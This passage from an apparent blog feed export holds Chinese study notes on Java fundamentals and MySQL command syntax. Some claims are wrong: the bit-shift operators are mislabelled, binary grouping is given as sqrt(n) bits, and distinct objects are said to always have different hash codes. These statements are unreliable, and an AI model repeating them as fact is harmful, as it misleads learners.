<li>&amp;逻辑与：不管第一个条是否为false，第二个条件都要判断</li>
<li>开发中，基本使用&amp;&amp;</li>
</ol>
<h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><blockquote>
<blockquote>
<blockquote>
<p>无符号右移  &gt;&gt; 算术右移 &lt;&lt; 算术左移</p>
</blockquote>
</blockquote>
</blockquote>
<h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h4><p>基本语法：条件表达式?表达式1：表达式2</p>
<p>表达式1和表达式2要为可以赋给接收变量的类型（或可以自动转换）</p>
<h4 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h4><h5 id="n进制转10进制"><a href="#n进制转10进制" class="headerlink" title="n进制转10进制"></a>n进制转10进制</h5><p>规则：从最低位开始，将每个位上的数据提取出来，乘以n的(位数-1)次方，然后求和</p>
<h5 id="10进制转n进制"><a href="#10进制转n进制" class="headerlink" title="10进制转n进制"></a>10进制转n进制</h5><p>规则：将该数不断除以n，直到商为0为止，然后将每步得到的余数倒过来，就是对应的n进制</p>
<h5 id="2进制转n进制"><a href="#2进制转n进制" class="headerlink" title="2进制转n进制"></a>2进制转n进制</h5><p>规则：从低位开始，将二进制数$sqrt(n)$位一组，转成对应的n进制数即可</p>
<h5 id="n进制转2进制"><a href="#n进制转2进制" class="headerlink" title="n进制转2进制"></a>n进制转2进制</h5><p>规则：将n进制数每一位，转成对应点一个$sqrt(n)$位二进制数即可</p>
<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ol>
<li>二进制的最高位是符号位：0表示正数，1表示负数</li>
<li>正数的原码，反码，补码都一样</li>
<li>负数的反码=它的原码符号位不变，其他位取反</li>
<li>负数的补码=它的反码+1，负数的反码=负数的补码-1</li>
<li>0的反码，补码都是0</li>
<li>java没有无符号数，换言之，java中的数都是有符号的</li>
<li>在计算机运算的时候，都是以补码的方式来运算的</li>
<li>但我们看运算结果的时候，要看它的原码</li>
</ol>
<h3 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h3><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><p>程序从上到下逐行地执行，中间没有任何判断和跳转</p>
<h4 id="分支控制"><a href="#分支控制" class="headerlink" title="分支控制"></a>分支控制</h4><h5 id="if-else-分支结构"><a href="#if-else-分支结构" class="headerlink" title="if else 分支结构"></a>if else 分支结构</h5><h5 id="switch-分支结构"><a href="#switch-分支结构" class="headerlink" title="switch 分支结构"></a>switch 分支结构</h5><p>注意case穿透，当没有break时，会跳到下一个执行语句，一直下去</p>
<ol>
<li>表达式数据类型，应和case后的常量类型一致，或者是可以自动转成可以互相比较的类型，比如输入的是字符，而常量是int</li>
<li>switch中表达式的返回值必须是：(byte,short,int,char,enum,String)</li>
<li>case子句中的值必须是常量，而不能是变量</li>
<li>default子句是可选的，当没有匹配的case时，执行default</li>
<li>break语句用来在执行完一个case分支后使程序跳出switch语句块；如果没有写break，程序会顺序执行到switch结尾</li>
</ol>
<h4 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h4><h5 id="for循环控制"><a href="#for循环控制" class="headerlink" title="for循环控制"></a>for循环控制</h5><p>基本语法<br>for(循环变量初始化;循环条件;循环变量迭代){<br>  循环操作(可以多条语句);<br>}</p>
<ol>
<li>循环条件是返回一个布尔值的表达式</li>
<li>for(;循环判断条件;)中的初始化和变量迭代可以写到其它地方，但是两边的分号不能省略</li>
<li>循环初始值可以有多条初始化语句，但要求类型一样，并且中间用逗号隔开，循环变量迭代也可以由多条变量迭代语句，中间用逗号隔开</li>
</ol>
<h5 id="while循环控制"><a href="#while循环控制" class="headerlink" title="while循环控制"></a>while循环控制</h5><p>基本语法<br>while(循环条件){<br>  循环体(语句);<br>  循环变量迭代;<br>}</p>
<h5 id="do-while循环控制"><a href="#do-while循环控制" class="headerlink" title="do-while循环控制"></a>do-while循环控制</h5><p>do{<br>  循环体(语句);<br>  循环变量迭代;<br>}while(循环条件)</p>
<h5 id="break"><a href="#break" class="headerlink" title="break"></a>break</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lable1:</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; <span class="number">4</span>;j++)&#123;</span><br><span class="line">  lable2:</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span> lable1;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;i=&quot;</span>+i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>break 语句可以指定退出哪层</li>
<li>lable1是标签，由程序员指定</li>
<li>break后指定到哪个lable就退出到哪里</li>
<li>在实际的开发中，尽量不要使用标签</li>
<li>如果没有指定break，默认退出最近的循环体</li>
</ol>
<h3 id="数组、排序和查找"><a href="#数组、排序和查找" class="headerlink" title="数组、排序和查找"></a>数组、排序和查找</h3><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><p>语法：数据类型 数组名[] = {元素值，元素值，，，}</p>
<h4 id="数组使用注意事项和细节"><a href="#数组使用注意事项和细节" class="headerlink" title="数组使用注意事项和细节"></a>数组使用注意事项和细节</h4><ol>
<li>数组是多个相同类型数据的组合，实现对这些数据的统一管理</li>
<li>数组中的元素可以是任何数据类型，包括基本类型和引用类型，但是不能混用</li>
<li>数组创建后，如果没有赋值，有默认值int 0,short 0,byte 0,long 0,float 0.0,double 0.0,char \u0000,boolean false,String null</li>
<li>使用数组的步骤1.声明数组并开辟空间 2 给数组各个元素负债 3 使用数组</li>
<li>数组的下标是从0开始</li>
<li>数组下标必须是在指定范围内使用，否则报：下标越界异常</li>
<li>数组属引用类型，数组型数据是对象</li>
</ol>
<h4 id="数组赋值机制"><a href="#数组赋值机制" class="headerlink" title="数组赋值机制"></a>数组赋值机制</h4><ol>
<li>基本数据类型赋值，这个值就是具体的数据，而且相互不影响</li>
<li>数组在默认情况下是引用传递，赋的值是地址</li>
</ol>
<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><h5 id="内部排序"><a href="#内部排序" class="headerlink" title="内部排序"></a>内部排序</h5><p>指将需要处理的所有数据都加载到内部存储器中进行排序</p>
<h5 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h5><p>数据量过大，无法全部加载到内存中，需要借助外部存储进行排序</p>
<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><h5 id="动态初始化-1"><a href="#动态初始化-1" class="headerlink" title="动态初始化"></a>动态初始化</h5><p>方式1 语法：类型[][] 数组名 = new 类型[大小][大小]</p>
<p>方式2<br>先声明：类型 数组名[][]<br>再定义数组名 = new 类型 [大小][大小]<br>赋值</p>
<h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>Java内存的结构分析</p>
<ol>
<li>栈：一般存放基本数据类型（局部变量）</li>
<li>堆：存放对象</li>
<li>方法区：常量池，类加载信息</li>
</ol>
<p>形参列表</p>
<ol>
<li>一个方法可以有0个参数，也可以有多个参数，中间用逗号隔开</li>
<li>参数类型可以为任意类型，包含基本类型或引用类型</li>
<li>调用带参数的方法时，一定对应着参数列表传入相同类型或兼容类型的参数</li>
<li>方法定义时的参数统称为形式参数，简称形参；方法调用时的传入参数称为实际参数，简称实参，实参和形参的类型要一致或兼容、个数、顺序必须一致</li>
</ol>
<p>方法调用细节</p>
<ol>
<li>同一个类中的方法调用：直接调用即可</li>
<li>跨类中的方法A类调用B类方法：需要通过对象名调用</li>
<li>跨类的方法调用和方法的访问修饰符相关</li>
</ol>
<h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><h5 id="递归重要规则"><a href="#递归重要规则" class="headerlink" title="递归重要规则"></a>递归重要规则</h5><ol>
<li>执行一个方法时，就创建一个新的受保护的独立空间（栈空间）</li>
<li>方法的局部变量是独立的，不会相互影响，比如n变量</li>
<li>如果方法中使用的是引用类型变量，就会共享该引用类型的数据</li>
<li>递归必须向退出递归的条件逼近，否则就是无限递归</li>
<li>当一个方法执行完毕，或者遇到return，就会返回，遵守谁调用，就将结果返回给谁，同时当方法执行完毕或者返回时，该方法也就执行完毕</li>
</ol>
<h4 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h4><p>同一个类中，多个同名方法的存在，但要求形参列表不一致</p>
<p>重载的好处</p>
<ol>
<li>减轻了起名的麻烦</li>
</ol>
<p>注意事项</p>
<ol>
<li>方法名必须相同</li>
<li>参数列表必须不同</li>
<li>返回类型无要求</li>
</ol>
<h4 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h4><ol>
<li>可变参数的实参可以为0个或任意多个</li>
<li>可变参数的实参可以为数组</li>
<li>可变参数的本质就是数组</li>
<li>可变参数可以和普通类型的参数一起放在形参列表，但必须保证可变参数在最后</li>
<li>一个形参列表中只能出现一个可变参数</li>
</ol>
<h4 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h4><p>构造方法又叫构造器，是类的一种特殊的方法，它的主要作用是完成对新对象的初始化</p>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ol>
<li>方法名和类名相同</li>
<li>没有返回值</li>
<li>在创建对象时，系统会自动的调用该类的构造器完成对对象的初始化</li>
</ol>
<h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><ol>
<li>一个类可以定义多个不同的构造器，即构造器重载</li>
<li>构造器名和类名要相同</li>
<li>构造器没有返回值</li>
<li>构造器是完成对象的初始化，并不是创建对象</li>
<li>在创建对象时，系统自动的调用该类的构造方法</li>
<li>如果程序员没有定义构造器，系统会自动给类生成一个默认无参构造方法</li>
<li>一旦定义了自己的构造器，默认的构造器就覆盖了，就不能再使用默认的无参构造器，除非显式的定义一下</li>
</ol>
<h4 id="对象创建流程"><a href="#对象创建流程" class="headerlink" title="对象创建流程"></a>对象创建流程</h4><ol>
<li>加载类信息，只会加载一次</li>
<li>在堆中分配空间(地址)</li>
<li>完成对象初始化（默认初始化，显式初始化，构造器初始化）</li>
<li>对象在堆中的地址，返回给p(p是对象名,也可理解为对象的引用)</li>
</ol>
<h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h4><ol>
<li>this关键字可以用来访问本类的属性、方法、构造器</li>
<li>this用于区分当前类的属性和局部布局</li>
<li>访问成员方法的语法：this.方法名</li>
<li>访问构造器语法：this(参数列表)；只能在构造器中使用(即只能在构造器中访问另外一个构造器，必须放在第一条语句)</li>
<li>this不能在类定义的外部使用，只能在类定义的方法中使用</li>
</ol>
<h4 id="包"><a href="#包" class="headerlink" title="包"></a>包</h4><p>三大作用</p>
<ol>
<li>区分相同名字的类</li>
<li>当类很多时，可以很好的管理类</li>
<li>控制访问范围</li>
</ol>
<p>命名规则：只能包含数字、字母、下划线、小圆点，不能用数字开头，不能是关键字或保留字</p>
<p>命名规范：com.公司名.项目名.业务模块名</p>
<h4 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h4><p>公开级别：用public修饰<br>受保护级别：用protected修饰，对子类和同一个包中的类公开<br>默认级别：没有修饰符号，向同一个包的类公开<br>私有级别：用private修饰，只有类本身可以访问，不对外公开<br><img src="/2021/10/02/Java%E5%AD%A6%E4%B9%A0/访问修饰符.png" alt="photo"></p>
<ol>
<li>修饰符可以用来修饰类中的属性，成员方法以及类</li>
<li>只有默认的和public才能修饰类，并且遵循上述访问权限的特点</li>
<li>成员方法的访问规则和属性完全一样</li>
</ol>
<h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>封装就是把抽象出的数据[属性]和对数据的操作[方法]封装在一起，数据被保护在内部，程序的其他部分只有通过被授权的操作[方法]，才能对数据进行操作</p>
<h5 id="封装的理解与好处"><a href="#封装的理解与好处" class="headerlink" title="封装的理解与好处"></a>封装的理解与好处</h5><ol>
<li>隐藏实现细节</li>
<li>可以对数据进行验证，保证安全合理</li>
</ol>
<h5 id="封装实现步骤"><a href="#封装实现步骤" class="headerlink" title="封装实现步骤"></a>封装实现步骤</h5><ol>
<li>将属性进行私有化private 【不能直接修改属性】</li>
<li>提供一个公共的(public)set方法，用于对属性判断并赋值</li>
<li>提供一个公共的get方法，用于获取属性的值</li>
</ol>
<h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><h5 id="继承基本语法"><a href="#继承基本语法" class="headerlink" title="继承基本语法"></a>继承基本语法</h5><p>class 子类 extends 父类{<br>}<br>子类就会自动拥有父类定义的属性和方法<br>父类又叫超类，基类<br>子类又叫派生类</p>
<h5 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h5><ol>
<li>子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问，但是私有属性不能在子类直接访问，要通过父类提供公共的方法去访问</li>
<li>子类必须调用父类的构造器，完成父类的初始化</li>
<li>当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参的构造器，则必须在子类的构造器中用super去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过</li>
<li>如果希望指定去调用父类的某个构造器，则显式的调用一下</li>
<li>super在使用时，需要放在构造器第一行</li>
<li>super()和this()都只能放在构造器第一行，因此这两个方法不能共存在一个构造器</li>
<li>java所有类都是Object类的子类</li>
<li>父类构造器的调用不限于直接父类！将一直往上追溯到Object类</li>
<li>子类最多只能继承一个父类（指直接继承），即java中是单继承机制</li>
<li>不能滥用继承，子类和父类之间必须满足is-a的逻辑关系</li>
</ol>
<h4 id="super关键字"><a href="#super关键字" class="headerlink" title="super关键字"></a>super关键字</h4><ol>
<li>访问父类的属性，但不能访问父类的private属性 super.属性名</li>
<li>访问父类的方法，不能访问父类的private方法 super.方法名(参数列表)</li>
<li>访问父类的构造器：super(参数列表);只能放在构造器的第一句</li>
<li>当子类中有和父类中的成员(属性和方法)重名时，为了访问父类的成员，必须通过super。如果没有重名，使用super、this、直接访问时一样的效果</li>
<li>super的访问不限于直接父类，如果爷爷类和本类中有同名的的成员，也可以使用super去访问爷爷类的成员；如果多个基类中都有同名的成员，使用super访问遵循就近原则</li>
</ol>
<h4 id="方法重写-覆盖-override"><a href="#方法重写-覆盖-override" class="headerlink" title="方法重写/覆盖(override)"></a>方法重写/覆盖(override)</h4><ol>
<li>子类的方法的形参列表，方法名称，要和父类方法的参数，方法名称完全一样</li>
<li>子类方法的返回类型和父类方法返回类型一样，或者是父类返回类型的子类</li>
<li>子类方法不能缩小父类方法的访问权限</li>
</ol>
<p><img src="/2021/10/02/Java%E5%AD%A6%E4%B9%A0/方法重写和重载.png" alt="photo"></p>
<h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><h5 id="多态的具体实现"><a href="#多态的具体实现" class="headerlink" title="多态的具体实现"></a>多态的具体实现</h5><ol>
<li>方法的多态。重写和重载就体现多态</li>
<li>对象的多态<ol>
<li>一个对象的编译类型和运行类型可以不一致</li>
<li>编译类型在定义对象时，就确定了，不能改变</li>
<li>运行类型是可以改变的</li>
<li>编译类型看定义时 = 号 的左边，运行类型看 = 号的 右边</li>
</ol>
</li>
</ol>
<h5 id="多态细节"><a href="#多态细节" class="headerlink" title="多态细节"></a>多态细节</h5><p>多态的前提是：两个对象存在继承关系<br>多态的向上转型</p>
<ol>
<li>本质：父类的引用指向了子类的对象</li>
<li>语法：父类类型 引用名 = new 子类类型();</li>
<li>特点：编译类型看左边，运行类型看右边。可以调用父类中的所有成员，不能调用子类中的特有成员；最终运行效果看子类的具体实现</li>
</ol>
<p>多态的向下转型</p>
<ol>
<li>语法：子类类型 引用名 = （子类类型）父类引用;</li>
<li>只能强转父类的引用，不能强转父类的对象</li>
<li>要求父类的引用必须指向的是当前目标类型的对象</li>
<li>可以调用子类类型中所有成员</li>
</ol>
<p>属性没有重写之说，属性的值看编译类型<br>instanceOf比较操作符，用于判断对象的运行类型是否为xx类型或xx类型的子类型</p>
<h5 id="动态绑定机制"><a href="#动态绑定机制" class="headerlink" title="动态绑定机制"></a>动态绑定机制</h5><ol>
<li>当调用对象方法时的时候，该方法会和对象的内存地址/运行类型绑定</li>
<li>当调用对象属性时，没有动态绑定机制，哪里声明，哪里使用</li>
</ol>
<h5 id="多态应用"><a href="#多态应用" class="headerlink" title="多态应用"></a>多态应用</h5><p>多态数组：数组定义类型为父类类型，里面保存的实际元素类型为子类类型<br>多态参数：方法定义的形参类型为父类类型，实参类型运行子类类型</p>
<h4 id="Object类详解"><a href="#Object类详解" class="headerlink" title="Object类详解"></a>Object类详解</h4><h5 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h5><ol>
<li>==：既可以判断基本类型，又可以判断引用类型</li>
<li>==：如果判断基本类型，判断的是值是否相等</li>
<li>==：如果判断引用类型，判断的是地址是否相等，即判定是不是同一个对象</li>
<li>equals：是Object类中的方法，只能判断引用类型</li>
<li>equals默认判断的是地址是否相等，子类中往往重写该方法，用于判断内容是否相等</li>
</ol>
<h5 id="hashCode方法"><a href="#hashCode方法" class="headerlink" title="hashCode方法"></a>hashCode方法</h5><ol>
<li>提高具有哈希结构的容器的效率</li>
<li>两个引用，如果指向的是同一个对象，则哈希值肯定是一样的</li>
<li>两个引用，如果指向的是不同对象，则哈希值是不一样的</li>
<li>哈希值主要根据地址号来的！，不能完全将哈希值等价于地址</li>
</ol>
<h5 id="toString方法"><a href="#toString方法" class="headerlink" title="toString方法"></a>toString方法</h5><p>默认返回：全类名+@+哈希值的十六进制，子类往往重写toString方法，用于返回对象的属性信息</p>
<h5 id="finalize方法"><a href="#finalize方法" class="headerlink" title="finalize方法"></a>finalize方法</h5><ol>
<li>当对象被回收时，系统自动调用该对象的finalize方法，子类可以重写该方法，做一下释放资源的操作</li>
<li>什么时候回收：当某个对象没有任何引用时，则jvm就认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁对象，在销毁该对象前，会先调用finalize方法</li>
<li>垃圾回收机制的调用，是由系统来决定，也可以通过System.gc()主动触发垃圾回收机制</li>
</ol>
<h5 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h5><p>在断点调试过程中，是运行状态，是以对象的运行类型来执行的</p>
]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL语法</title>
    <url>/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>MySQL的较为系统语法学习。<br><span id="more"></span></p>
<h2 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h2><h3 id="启动mysql数据库服务"><a href="#启动mysql数据库服务" class="headerlink" title="启动mysql数据库服务"></a>启动mysql数据库服务</h3><ol>
<li>服务方式启动（界面）</li>
<li>net stop mysql服务名</li>
<li>net start mysql服务名</li>
</ol>
<h3 id="命令行窗口连接MySQL数据库"><a href="#命令行窗口连接MySQL数据库" class="headerlink" title="命令行窗口连接MySQL数据库"></a>命令行窗口连接MySQL数据库</h3><blockquote>
<p>mysql -u root(用户名) -P 端口(默认3306) -h 主机名(默认本机) -p(密码)  //(ryb)</p>
</blockquote>
<p><strong>先输入set names gbk;</strong></p>
<h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><blockquote>
<p>show databases;</p>
</blockquote>
<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><p><strong>查看字符集</strong></p>
<blockquote>
<p>show charset;</p>
</blockquote>
<p><strong>查看可用校对规则</strong></p>
<blockquote>
<p>show collation;</p>
</blockquote>
<p><strong>创建数据库</strong></p>
<blockquote>
<p>create database 数据库名 [charset 字符集名称] [COLLATE 校对规则（一般不写）];</p>
</blockquote>
<p>例：create database php charset utf8;</p>
<ol>
<li>COLLATE默认为utf8_general_ci 不区分大小写，utf8_bin 区分大小写</li>
</ol>
<p><strong>查看数据库</strong></p>
<blockquote>
<p>show databases</p>
</blockquote>
<p><strong>显示数据库创建语句</strong></p>
<blockquote>
<p>show create database 数据库名;</p>
</blockquote>
<p>其实就是能看到指定数据的完整创建语句（含默认值的选项，比如charset，collate）。</p>
<h4 id="删除现有数据库"><a href="#删除现有数据库" class="headerlink" title="删除现有数据库"></a>删除现有数据库</h4><blockquote>
<p>drop database 数据库名 [if exists];</p>
</blockquote>
<h4 id="修改数据库"><a href="#修改数据库" class="headerlink" title="修改数据库"></a>修改数据库</h4><blockquote>
<p>alter database 数据库名 charset 新的字符集名称 collate 新的校对规则名;</p>
</blockquote>
<h4 id="选择-使用-某个数据库"><a href="#选择-使用-某个数据库" class="headerlink" title="选择(使用)某个数据库"></a>选择(使用)某个数据库</h4><blockquote>
<p>use 数据库名;</p>
</blockquote>
<h3 id="数据表操作"><a href="#数据表操作" class="headerlink" title="数据表操作"></a>数据表操作</h3><h4 id="显示所有表"><a href="#显示所有表" class="headerlink" title="显示所有表"></a>显示所有表</h4><blockquote>
<p>show tables;</p>
</blockquote>
<h4 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h4><blockquote>
<p>create table 数据表名1 （字段1，字段2….) [charset=字符集] [type/engine=表类型];</p>
</blockquote>
<ul>
<li>字段形式为： 字段名 字段类型 [字段属性]</li>
<li>字符集类型：utf,gbk,gb2312,big5等。默* 认是数据库字符集，可用不写</li>
<li>表类型：InnoDB,MyIsam等，默认是InnoDB，可以不写。</li>
</ul>
<h4 id="查看数据表结构"><a href="#查看数据表结构" class="headerlink" title="查看数据表结构"></a>查看数据表结构</h4><blockquote>
<p>desc 表名;</p>
</blockquote>
<h4 id="查看数据表的创建语句"><a href="#查看数据表的创建语句" class="headerlink" title="查看数据表的创建语句"></a>查看数据表的创建语句</h4><blockquote>
<p>show create table 表名;</p>
</blockquote>
<h4 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h4><blockquote>
<p>drop table 表名;</p>
</blockquote>
<h4 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h4><p><strong>添加列：</strong></p>
<blockquote>
<p>alter table 表名 add 字段名 字段类型 [字段属性…] [after 某字段名 或first];</p>
</blockquote>
<p>默认放到最后<br><strong>修改列</strong></p>
<blockquote>
<p>alter table 表名 change 旧字段名 新字段 字段类型 [字段属性…];<br>alter table 表名 modify 要修改的字段名 字段类型 [字段属性..];</p>
</blockquote>
<p><strong>删除列</strong></p>
<blockquote>
<p>alter table 表名 drop 要删除的字段名;</p>
</blockquote>
<p><strong>修改表名</strong></p>
<blockquote>
<p>Rename table 表名 to 新表名</p>
</blockquote>
<p><strong>修改字符集</strong></p>
<blockquote>
<p>alter table 表名 character set 新的字符集;</p>
</blockquote>
<h3 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h3><h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><blockquote>
<p>insert into 表名 (字段名1，字段名2，…) values (数据1，数据2，…);</p>
</blockquote>
<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><blockquote>
<p>select [DISTINCT] 字段名1,字段名2,…. from 表名 [where 条件];</p>
</blockquote>
<p>where子句常用运算符<br><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/where字句运算符.png" alt="photo"></p>
<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><blockquote>
<p>delete from 表名 [where 条件];</p>
</blockquote>
<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><blockquote>
<p>update 表名 set 字段名1 = 新值，字段名=新值2，….[where 条件];</p>
</blockquote>
<h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p><img src="/2020/05/15/MySQL%E8%AF%AD%E6%B3%95/数据类型.png" alt="photo"></p>
<h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><blockquote>
<p>tinyint [1个字节] [-128,127] 或 [0,255]<br>smallint [2个字节][-32768,32767]<br>mediumint [3个字节][-8388608,8388607]<br>int [4个字节]<br>bigint [8个字节]</p>
</blockquote>
<h4 id="小数型"><a href="#小数型" class="headerlink" title="小数型"></a>小数型</h4><blockquote>
<p>float[单精度 4个字节]<br>double[双精度 8个字节]<br>decimal[M,D] (M是小数位数的总数，D是小数点后面的位数) [大小不确定]</p>
</blockquote>
<h4 id="二进制数据类型"><a href="#二进制数据类型" class="headerlink" title="二进制数据类型"></a>二进制数据类型</h4><blockquote>
<p>blob[0~2^16-1]<br>longblob[0~2^32-1]</p>
</blockquote>
<h4 id="日期时间型"><a href="#日期时间型" class="headerlink" title="日期时间型"></a>日期时间型</h4><blockquote>
<p>date 格式”0000-00-00”<br>time 格式”00:00:00”<br>datatime [年月日 时分秒 YYYY-MM-DD HH:mm:ss]<br>timestamp 格式”0000-00-00 00:00:00”<br>year 格式”0000”</p>
</blockquote>
<h4 id="文本类型-字符串类型"><a href="#文本类型-字符串类型" class="headerlink" title="文本类型(字符串类型)"></a>文本类型(字符串类型)</h4><h5 id="char"><a href="#char" class="headerlink" title="char"></a>char</h5><p>4个字符数，固定长度，最长设定255个字符</p>
<h5 id="varchar"><a href="#varchar" class="headerlink" title="varchar"></a>varchar</h5><p>可变长度，最长65532个字符<br>本身还需要占用1-3个字节来记录存放内容长度</p>
<h5 id="text"><a href="#text" class="headerlink" title="text"></a>text</h5><p>不能设置长度。<br>存储较长文本内容。,最长65535个字符<br>mediumtext(100万字）<br>longtext(40亿左右）<br>不能设置默认值</p>
<h5 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h5><p>枚举类型（单选项）<br>最多65535个选项</p>
<h5 id="set"><a href="#set" class="headerlink" title="set"></a>set</h5><p>多选类型</p>
<h4 id="列属性"><a href="#列属性" class="headerlink" title="列属性"></a>列属性</h4><ol>
<li>一个列可以有多个列属性；</li>
<li>多个列属性空格隔开就行；</li>
</ol>
<ul>
<li>null,not null<ul>
<li>设定为空，或非空，表明该列数据是否可为空值（null）。</li>
</ul>
</li>
<li>default<ul>
<li>用于设定列默认值（不给值或给空值null,就会自动使用该值）</li>
<li>使用形式：default 默认值。</li>
</ul>
</li>
<li>primary key<ul>
<li>用于设定主键</li>
<li>主键就是一个表中数据的“关键值”，通过该关键值就可以找到该特定的数据行。</li>
<li>一个表的主键值不能重复（相等），比如文章表中的文章编号id，比如用户表中的用户名。</li>
<li>主键字段必须有值（不能为空）。</li>
<li>一个表只能有一个主键（但一个主键可以是1个字段或2个以上的字段联合构成）</li>
</ul>
</li>
<li>foreign key<ul>
<li>用于设定外键</li>
<li>外键指向的表的字段，要求是primary key或者是unique</li>
<li>表的类型是innodb，这样的表才支持外键</li>
<li>外键字段的类型要和主键字段的类型一致（长度可以不同）</li>
<li>外键字段的值，必须在主键字段中出现过，或者为null</li>
<li>一旦建立主外键的关系，数据不能随意删除了</li>
</ul>
</li>
<li>auto_increment<ul>
<li>用于设定一个整数字段的值是“自增长的”，通常用于一个表中的数据行的编号（比如文章编号）</li>
<li>默认情况下自增长值从1开始</li>
<li>一个表只能设定一个字段为自增长特性</li>
</ul>
</li>
<li>unique key<ul>
<li>用于设定“唯一键”的特性。</li>
<li>唯一键表示一个表中的某字段的值是“唯一的”，“不重复的”。</li>
<li>唯一键有点类似primay key，但其值可以为空（null）</li>
</ul>
</li>
<li>check</li>
<li>comment<ul>
<li>用于设定字段的说明性内容，类似注释，但又不是注释（属于有效的代码）</li>
<li>使用形式：comment ‘文字内容’</li>
</ul>
</li>
</ul>
<h3 id="高级查询"><a href="#高级查询" class="headerlink" title="高级查询"></a>高级查询</h3><h4 id="语法概述"><a href="#语法概述" class="headerlink" title="语法概述"></a>语法概述</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 子句</span><br><span class="line">    [<span class="keyword">from</span> 子句]</span><br><span class="line">    [<span class="keyword">where</span> 子句]</span><br><span class="line">    [<span class="keyword">group</span> <span class="keyword">by</span> 子句]</span><br><span class="line">    [<span class="keyword">having</span> 子句]</span><br><span class="line">    [<span class="keyword">order</span> <span class="keyword">by</span> 子句]</span><br><span class="line">    [limit 子句]</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>
<h4 id="查询出的数据字段可以使用别名"><a href="#查询出的数据字段可以使用别名" class="headerlink" title="查询出的数据字段可以使用别名"></a>查询出的数据字段可以使用别名</h4><p>例：<br>select 1 as dl,2+3 as d2;</p>
<h4 id="合计-统计函数"><a href="#合计-统计函数" class="headerlink" title="合计/统计函数"></a>合计/统计函数</h4><blockquote>
<p>select count(*)|count(列名) from table_name [where …] (如果为null不会统计 )<br>select sum(列名) from table_name [where …]<br>select avg(列名) from table_name [where …]<br>select max/min(列名) from table_name [where …]</p>
</blockquote>
